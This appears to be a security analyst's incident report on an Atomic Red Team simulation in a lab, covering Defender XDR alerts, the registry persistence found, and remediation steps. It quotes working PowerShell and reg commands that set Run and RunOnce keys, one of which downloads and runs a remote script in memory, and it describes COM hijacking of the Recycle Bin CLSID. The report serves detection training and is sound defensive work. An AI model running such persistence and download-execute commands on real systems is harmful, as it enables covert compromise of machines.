# Endpoint Attack Simulation Report 

## Overview
- An alert was generated in Microsoft Defender XDR as a result of intentional adversary simulation using Atomic Red Team. The activity was conducted in a controlled lab environment for testing and validation of detection capabilities. Atomic Red Team simulates real-world attacker techniques, which caused Defender for Endpoint to generate alerts related to suspicious PowerShell command-line activity

---


# Report


## Findings 

Commands Executed:

	- "powershell.exe" & {$RunOnceKey = \""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"" set-itemproperty $RunOnceKey \""NextRun\"" 'powershell.exe \""IEX (New-Object Net.WebClient).DownloadString(`\""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"")\""'}

	- "powershell.exe" & {$RunKey = \""HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\"" Set-ItemProperty -Path $RunKey -Name \""socks5_powershell\"" -Value \""powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\""}

	- "cmd.exe" /c REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Path\AtomicRedTeam.exe"

Files found: 
- Calc.exe

	
## Investigation Summary 

On `2025-12-19 00:24:51 UTC`, Defender XDR had created an Alert on "Suspicious PowerShell Command Line". John Doe had executed multiple PowerShell commands. One of which establishes RunOnce persistence that triggers PowerShell to download and execute a remote script in memory, simulating fileless post-exploitation activity (*Figure 1*). Furthermore, on `2025-12-19 00:24:57 UTC`, another PowerShell command was executed, creating a registry Run Key that launches hidden PowerShell with execution policy bypass at every logon (*Figure 2*). At the exact same time, it was observed that COM hijacking had taken place by modifying the Recycle Bin CLSID open command so that calc.exe  runs when an Object is invoked. So when Recycle Bin is opened, calc.exe is executed. Though unknown what the capabilities of calc.exe are, this is likely establishing persistence based on its stored location (*Figure 3*). Based on the available evidence, there was no further observed activity from John Doe. When scoping to see if other accounts were seen executing PowerShell commands, based on the evidence seen on *Figure 4*, there were no observed activities. However, due to how recent this is, this is subject to change. 



	
## Who, What, When, Where, Why, How 

Who - Who was involved? 
- User: John Doe
- Host: soc-project-samir-vm-01
- No other user accounts were observed executing PowerShell or related suspicious activity at the time of investigation (*Figure 4*)
		 

What - What happened? 
- Defender XDR generated an alert for "Suspicious PowerShell Command Line"
- Established RunOnce persistence to download and execute a remote script in memory
- Created a registry Run Key to launch hidden Powerhsell with execution policy bypass at every logon
- Modified a COM SCLSID (Recycle Bin) open command, causing calc.exe to execute when the object is invoked.
- These actions demonstrate multiple persistence mechanisms being established on the endpoint. 
	

When - When did this occur, and is it still happening?
- Initial activity observed on `2025-12-19 00:24:51 UTC`.
- Additional persistence-related registry modifications occurred at `2025-12-19 00:24:57 UTC`.
- At the time of investigation, no further activity was observed
- Due to the recency of the activity, continued monitoring is recommended.
			
	
	
Where - Where in the environment did this happen? 
- The activity occurred on a Windows endpoint
- Registry locations impacted:
  - HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
  - HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command
					
			
How - How did this happen?
- PowerShell was used to:
- Download and execute the remote script in memory
- Modify Registry RunOnce and Run Keys to maintain persistence
- Reg.exe was used to hijack a COM object (Recycle Bin CLSID) to execute calc.exe
	
	
## Recommendations: 

Remove all malicious or unauthorised registry entries related to persistence:
- Delete any suspicious values under:
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
  - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
  - `HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command`

Review historical PowerShell activity for the affected user and device using Advanced Hunting.
Identify usage of high-risk PowerShell flags such as:
- `-ExecutionPolicy Bypass`
- `-WindowStyle Hidden`
- `Invoke-Expression`

Reset Affected User Credentials
- Immediately reset the password for the affected user account (John Doe).
- Revoke all active sessions and refresh authentication tokens to prevent potential account reuse.
- Monitor for any failed or suspicious login attempts for the password reset for John Doe. 


## Screenshots 

<p align="center">
  <img width="1648" height="31" alt="image" src="https://github.com/user-attachments/assets/aec31ae7-2653-4f86-b0c1-4193670b9558" />
</p>
<p align="center"><b>Figure 1: PowerShell RunOnce persistence executing a remote script via in-memory execution</b></p>


<p align="center">
  <img width="1662" height="31" alt="image" src="https://github.com/user-attachments/assets/74428856-96db-4fb4-9b79-3995a676489d" />
</p>
<p align="center"><b>Figure 2: Registry Run key persistence configured to execute hidden PowerShell at user logon</b></p>



<p align="center">
  <img width="985" height="28" alt="image" src="https://github.com/user-attachments/assets/a6565e62-96ef-4a86-acfb-2f75f2b09f88" />
</p>
<p align="center"><b>Figure 3: Registry modification establishing COM hijacking–based persistence</b></p>



<p align="center">
  <img width="1236" height="674" alt="image" src="https://github.com/user-attachments/assets/71e9091c-ad99-4b1a-9549-cadd1f313383" />
</p>
<p align="center"><b>Figure 4: KQL query confirming no additional user accounts executed PowerShell (excluding SYSTEM)</b></p>
